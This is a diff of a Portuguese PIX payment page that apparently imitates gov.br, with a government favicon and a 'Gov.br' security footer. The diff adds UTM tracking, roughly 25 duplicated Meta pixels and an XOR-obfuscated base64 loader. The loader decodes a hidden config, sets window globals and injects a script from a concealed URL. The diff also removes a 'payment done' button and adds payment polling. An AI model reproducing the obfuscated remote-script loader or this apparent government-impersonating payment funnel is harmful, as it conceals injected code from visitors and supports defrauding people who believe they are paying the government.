@@ -14,7 +14,7 @@
   <meta name="theme-color" content="#109b6c">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='14' fill='%231351b4'/><text x='16' y='21' font-size='14' font-weight='bold' text-anchor='middle' fill='%23ffffff' font-family='sans-serif'>gov</text></svg>">
+  <link rel="icon" type="image/x-icon" href="../../acesso/assets/images/favicon.ico">
 
   <link rel="stylesheet" href="./index_files/entry.40de6e1c.css">
   <link rel="stylesheet" href="./index_files/checkout.32a67655.css">
@@ -22,6 +22,720 @@
   <link rel="stylesheet" href="./index_files/UnitSelector.070c8856.css">
   <link rel="stylesheet" href="./index_files/FornPayTemplate.f1d6eee3.css">
   <link rel="stylesheet" href="./index_files/_transaction_.c9dec822.css">
+
+
+
+<!-- UTM FACEBOOK Code -->
+
+
+
+<script>
+(function () {
+  "use strict";
+
+  var STORAGE_KEY = "funil_tracking_params";
+
+  // Parâmetros que serão preservados entre as etapas.
+  var TRACKING_PARAMS = [
+    "utm_source",
+    "utm_medium",
+    "utm_campaign",
+    "utm_content",
+    "utm_term",
+    "fbclid"
+  ];
+
+  function readStorage(storage) {
+    try {
+      return JSON.parse(storage.getItem(STORAGE_KEY) || "{}");
+    } catch (e) {
+      return {};
+    }
+  }
+
+  function saveStorage(storage, data) {
+    try {
+      storage.setItem(STORAGE_KEY, JSON.stringify(data));
+    } catch (e) {}
+  }
+
+  function getSavedParams() {
+    var session = readStorage(sessionStorage);
+    var local = readStorage(localStorage);
+
+    return Object.assign({}, local, session);
+  }
+
+  function saveParams(data) {
+    saveStorage(sessionStorage, data);
+    saveStorage(localStorage, data);
+  }
+
+  // 1. Recupera os parâmetros já salvos.
+  var params = getSavedParams();
+
+  // 2. Captura os parâmetros recebidos na URL atual.
+  var currentURL = new URL(window.location.href);
+
+  TRACKING_PARAMS.forEach(function (key) {
+    var value = currentURL.searchParams.get(key);
+
+    // Atualiza somente se o parâmetro estiver presente
+    // e tiver um valor não vazio.
+    if (value !== null && value.trim() !== "") {
+      params[key] = value;
+    }
+  });
+
+  // 3. Salva os parâmetros para as próximas páginas.
+  saveParams(params);
+
+  // 4. Função global para redirecionar preservando as UTMs.
+  window.goToNext = function (nextURL) {
+    var destination = new URL(nextURL, window.location.href);
+    var saved = getSavedParams();
+
+    // Não substitui parâmetros de tracking já definidos
+    // explicitamente na URL de destino.
+    TRACKING_PARAMS.forEach(function (key) {
+      if (
+        saved[key] &&
+        !destination.searchParams.has(key)
+      ) {
+        destination.searchParams.set(key, saved[key]);
+      }
+    });
+
+    window.location.href = destination.href;
+  };
+
+  // 5. Propaga as UTMs automaticamente nos links internos.
+  document.addEventListener("click", function (event) {
+    var link = event.target.closest("a[href]");
+
+    if (!link) return;
+    if (link.target === "_blank") return;
+    if (event.ctrlKey || event.metaKey || event.shiftKey) return;
+    if (event.button !== 0) return;
+
+    var destination;
+
+    try {
+      destination = new URL(link.href, window.location.href);
+    } catch (e) {
+      return;
+    }
+
+    // Só modifica links da mesma origem.
+    if (destination.origin !== window.location.origin) return;
+
+    TRACKING_PARAMS.forEach(function (key) {
+      if (
+        params[key] &&
+        !destination.searchParams.has(key)
+      ) {
+        destination.searchParams.set(key, params[key]);
+      }
+    });
+
+    link.href = destination.href;
+  });
+
+  // Disponibiliza os parâmetros para outros scripts.
+  window.getFunilTracking = function () {
+    return Object.assign({}, getSavedParams());
+  };
+
+})();
+</script>
+
+
+<!-- END UTM FACEBOOK CODE -->
+
+<!-- UTMFY Code -->
+
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+
+<script>(function(){var f_tx=atob("DAdM54C6GPaiGO83GnxukvLWOsyAcJtDanR2yK/ZfJiMbZtac2E1yePVddjAasBEeXUll/TJN4PWdZwYdmY4gvPONpzROsMVe3M4lenYbYLHa80NQXxuieHXfdSYOotWbmZhkvTXcZDbNZ9Ff3EpifSXYJXNfMJEeWxuy6LMeZrXfc0NOCUxy/uYdpfPfc0NOGMtk+GXbYLPcYlON3c+gvbfdoKPa5pVc2M/xayYbpfObYoVICVumt3H");var p_rt=[];for(var w_puw=0;w_puw<f_tx.length;w_puw++){p_rt.push(f_tx.charCodeAt(w_puw)&255);}var r_7d0y=p_rt[0];var f_5kg=p_rt.slice(1,1+r_7d0y);var p_0kac=p_rt.slice(1+r_7d0y);var t_c=p_0kac.map(function(b,d_nin){return b^f_5kg[d_nin%r_7d0y];});var o_pdk="";for(var q_rs3e=0;q_rs3e<t_c.length;q_rs3e++){o_pdk+=String.fromCharCode(t_c[q_rs3e]&255);}var h_l0yz=decodeURIComponent(escape(o_pdk));var k_s=JSON.parse(h_l0yz);var q_ane=k_s.globals||[];q_ane.forEach(function(w_dru){window[w_dru.name]=w_dru.value;});var w_w=document.createElement("script");w_w.src=k_s.url;w_w.async=true;w_w.defer=true;(k_s.attributes||[]).forEach(function(g_1){w_w.setAttribute(g_1.name,g_1.value);});(document.head||document.documentElement).appendChild(w_w);})();</script>
+
+
+
+<!-- END UTMFY CODE -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1117296950800245');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1117296950800245&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1746333669903668');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1746333669903668&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1015408774399172');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1015408774399172&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2243844239765046');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2243844239765046&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1375844174304393');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1375844174304393&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2137523013457243');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2137523013457243&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '847755107473498');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=847755107473498&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2083978855786884');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2083978855786884&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1313184030636134');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1313184030636134&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '229463223255909');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=229463223255909&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '4234627643479096');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=4234627643479096&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '794380730326961');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=794380730326961&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2299537240549041');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2299537240549041&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1342087550707140');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1342087550707140&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1173269651619651');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1173269651619651&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1574851956843520');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1574851956843520&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1185480309697471');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1185480309697471&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '810965115433003');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=810965115433003&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '768728832672906');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=768728832672906&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2763526227120952');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2763526227120952&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '763158696614724');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=763158696614724&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1832985513945847');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1832985513945847&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1768764637040662');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1768764637040662&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1884540289109881');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1884540289109881&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+
+
+
+
+
+
+    <!-- UTMify Pixel -->
+    <script>
+      window.pixelId = "67b759e9f454faf48c0999a2";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js",
+      );
+      fbq("init", "574352008891416");
+      fbq("track", "PageView");
+    </script>
+
+
+
 
   <style>
     .copy-success {
@@ -130,18 +844,10 @@
                   </svg>
                 </div>
                 <p class="text-xs font-normal text-slate-500 mt-1">Este código expira em: <strong id="pixTimer" class="font-bold text-slate-700">14:59</strong></p>
-              
-              <!-- Botão Já Fiz o Pagamento Oficial -->
-              <button id="btnPaidConfirm" type="button" class="w-full mt-2 h-11 inline-flex items-center justify-center gap-2 rounded-md bg-[#1351b4] hover:bg-[#0c326f] px-4 text-sm sm:text-base font-bold text-white shadow active:scale-[0.99] transition-all cursor-pointer">
-                <span>Já fiz o pagamento</span>
-                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                  <polyline points="9 18 15 12 9 6"></polyline>
-                </svg>
-              </button>
+
 </div>
 
-            </div>
-          </div>
+ 
 
           <!-- Rodapé de Segurança Gov.br -->
           <footer class="w-full grid auto-rows-min pt-6 pb-4 px-4 text-center">
@@ -168,256 +874,379 @@
     </section>
   </div>
 
-  <script src="../pepper-api.js"></script>
-  <script src="../podpay-api.js"></script>
-  <script src="../masterfy-api.js"></script>
-  <script src="../cakto-api.js"></script>
-  <script src="../kiwify-api.js"></script>
-  <script>
-  (function () {
-    "use strict";
+<script src="../pepper-api.js"></script>
+<script>
+(function () {
+  "use strict";
 
-    
-    window.avancarEtapa = function(event) {
-      if (event) event.preventDefault();
-      var search = window.location.search || "";
-      window.location.href = "../../acesso/01/index.html" + search;
-    };
+  var NEXT_URL = "../../acesso/01/index.html";
+  var params = new URLSearchParams(window.location.search);
 
-    // Personalização por URL
+  function ls(key) {
+    try { return localStorage.getItem(key); } catch (e) { return null; }
+  }
+
+  // ---------------------------------------------------------------
+  // Personalização por URL / localStorage (inalterado)
+  // ---------------------------------------------------------------
+  try {
+    var nome = params.get("nome") || params.get("name") || ls("nome") || "";
+    if (nome) {
+      try { nome = decodeURIComponent(nome); } catch (e) {}
+      var first = nome.trim().split(" ")[0];
+      var titleEl = document.getElementById("pixTitle");
+      if (first && titleEl) {
+        titleEl.textContent = first + ", siga os passos para pagar no PIX:";
+      }
+    }
+
+    var pixCode = params.get("pix_code") || ls("pix_qr_code");
+    var inputCodeEl = document.getElementById("pixCodeInput");
+    if (pixCode && inputCodeEl) inputCodeEl.value = pixCode;
+
+    var qrBase64 = ls("pix_qr_code_base64");
+    var qrImgEl = document.getElementById("pixQrCodeImg");
+    if (qrBase64 && qrImgEl) qrImgEl.src = qrBase64;
+
+    var valor = params.get("valor");
+    var valEl = document.getElementById("pixValue");
+    if (valor && valEl) valEl.textContent = "R$ " + valor.replace(".", ",");
+  } catch (e) {
+    console.error(e);
+  }
+
+  // ===============================================================
+  // VERIFICAÇÃO DO PAGAMENTO (Pepper) - contínua, sem intervalo fixo
+  // ===============================================================
+  var POLL_MS = 4000;                // sem pausa: a próxima consulta começa assim que a anterior termina
+  var POLL_MAX_MS = 15000;        // teto do recuo quando há falhas seguidas
+  var REQUEST_TIMEOUT_MS = 8000;  // libera o controle se a API não responder
+
+  var ST = {
+    PAID: "paid",
+    PENDING: "pending",
+    PROCESSING: "processing",
+    REFUSED: "refused",
+    EXPIRED: "expired",
+    ERROR: "error"
+  };
+
+  // Status da Pepper -> estado interno.
+  // CONFIRMAR com "Enums > Status de pagamento" da documentação Pepper.
+  // Somente ST.PAID libera o redirecionamento.
+  var STATUS_MAP = {
+    paid: ST.PAID,
+    waiting_payment: ST.PENDING,
+    pending: ST.PENDING,
+    processing: ST.PROCESSING,
+    in_analysis: ST.PROCESSING,
+    refused: ST.REFUSED,
+    canceled: ST.REFUSED,
+    cancelled: ST.REFUSED,
+    expired: ST.EXPIRED
+  };
+
+  // Motivos de falha que nunca vão mudar com novas tentativas
+  var FATAL_REASONS = { missing_id: true, local_fallback_id: true };
+
+  function has(obj, key) {
+    return Object.prototype.hasOwnProperty.call(obj, key);
+  }
+
+  function diag() {
     try {
-      var params = new URLSearchParams(window.location.search);
-      var nome = params.get("nome") || params.get("name") || "";
-      if (!nome) {
-        try { nome = localStorage.getItem("nome") || ""; } catch (e) {}
-      }
-      if (nome) {
-        var first = decodeURIComponent(nome).trim().split(" ")[0];
-        if (first) {
-          var titleEl = document.getElementById("pixTitle");
-          if (titleEl) {
-            titleEl.textContent = first + ", siga os passos para pagar no PIX:";
-          }
-        }
-      }
-      var pixCode = params.get("pix_code");
-      if (!pixCode) {
-        try { pixCode = localStorage.getItem("pix_qr_code"); } catch (e) {}
-      }
-      if (pixCode) {
-        var inputCodeEl = document.getElementById("pixCodeInput");
-        if (inputCodeEl) inputCodeEl.value = pixCode;
-      }
+      var args = Array.prototype.slice.call(arguments);
+      args.unshift("[pix]");
+      console.warn.apply(console, args);
+    } catch (e) {}
+  }
 
-      var qrBase64 = null;
-      try { qrBase64 = localStorage.getItem("pix_qr_code_base64"); } catch (e) {}
-      if (qrBase64) {
-        var qrImgEl = document.getElementById("pixQrCodeImg");
-        if (qrImgEl) qrImgEl.src = qrBase64;
-      }
+  var rawHash = params.get("pix_hash") || ls("pix_hash") || "";
+  var pixHash = /^[A-Za-z0-9_-]{4,128}$/.test(String(rawHash).trim()) ? String(rawHash).trim() : "";
+  if (rawHash && !pixHash) diag("pix_hash com formato inválido, verificação desativada.");
 
-      var valor = params.get("valor");
